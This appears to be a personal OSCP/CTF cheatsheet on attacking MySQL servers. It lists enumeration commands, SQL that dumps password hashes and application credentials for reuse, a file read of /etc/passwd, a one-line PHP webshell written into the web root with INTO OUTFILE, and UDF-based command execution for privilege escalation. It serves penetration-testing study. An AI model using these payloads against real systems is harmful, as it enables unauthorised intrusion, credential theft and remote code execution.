---
tags: [hacking, ctf, oscp, mysql, database]
type: cheatsheet
source: compiled reference (MySQL enumeration)
last-verified: 2026-09-02
---

# MySQL (3306)

## Up
- [[Services]]

MySQL/MariaDB. Wins: **weak/blank root creds**, dumping app creds/hashes for reuse, and (if privileged/local) **file write → webshell** or **UDF → RCE**. Language reference: [[MySQL]] (Coding/SQL).

---

## Enumerate

```bash
nmap -p3306 -sC -sV $IP                 # version + mysql-info NSE
mysql -h $IP -u root -p                  # try blank / root / found creds
mysql -h $IP -u root                     # no password?
```

Version → `searchsploit mysql`. Note if login is allowed remotely.

---

## Foothold Techniques

```sql
-- enumerate
SHOW DATABASES; USE app; SHOW TABLES;
SELECT user,authentication_string FROM mysql.user;   -- hashes → crack ([[Hashcat]] -m 300)
SELECT * FROM users;                                  -- app creds → REUSE everywhere
SELECT @@version, current_user(), @@datadir, @@secure_file_priv;
```

```sql
-- file read (if FILE priv + secure_file_priv permits)
SELECT LOAD_FILE('/etc/passwd');

-- write a webshell (privileged, writable web root, secure_file_priv empty)
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';

-- UDF RCE (root-owned mysql + writable plugin dir) — raptor/lib_mysqludf_sys
--   SELECT sys_exec('...');   (advanced; usually leads to local root)
```

---

## Common Misconfigurations / Exploits

- **Blank/weak root password**, or remote root login enabled.
- App **credentials/hashes** in tables → crack ([[Password Cracking]]) and **reuse** on SSH/SMB.
- **`INTO OUTFILE`** with a writable web root → webshell → RCE.
- **UDF exploitation** (`lib_mysqludf_sys`) when mysql runs as root → OS command exec → privesc.
- SQLi elsewhere may pivot into MySQL (`sqlmap --os-shell`).

---

## OSCP Tips

- Try **blank/`root`** first; then creds found in web `config.php`/`.env`.
- The prize is usually **credentials in tables** → reuse for a real foothold/privesc.
- `INTO OUTFILE` needs `secure_file_priv` empty and a known writable web path.
- Local MySQL running as root + UDF is a **privilege-escalation** path once you're on the box.
